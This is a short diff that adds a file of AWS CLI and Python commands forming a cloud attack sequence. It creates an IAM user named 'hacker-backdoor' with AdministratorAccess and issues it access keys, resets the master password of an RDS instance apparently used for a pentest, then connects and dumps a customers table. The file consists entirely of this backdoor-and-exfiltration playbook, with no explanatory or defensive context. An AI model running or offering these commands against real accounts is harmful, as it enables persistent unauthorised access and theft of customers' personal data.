@@ -1,0 +1,12 @@
+aws iam create-user --user-name hacker-backdoor
+aws iam attach-user-policy --user-name hacker-backdoor --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+aws iam create-access-key --user-name hacker-backdoor
+
+
+aws configure set aws_session_token " "
+
+aws rds describe-db-instances --region eu-north-1
+
+aws rds modify-db-instance --db-instance-identifier pentest-rds --master-user-password Hacked123! --apply-immediately --region eu-north-1
+
+python -c "import mysql.connector; conn = mysql.connector.connect(host='pentest-rds.c7gqc8mue2ye.eu-north-1.rds.amazonaws.com', user='admin', password='Hacked123!', database='customerdb'); cursor = conn.cursor(); cursor.execute('SELECT * FROM customers'); print(cursor.fetchall())"
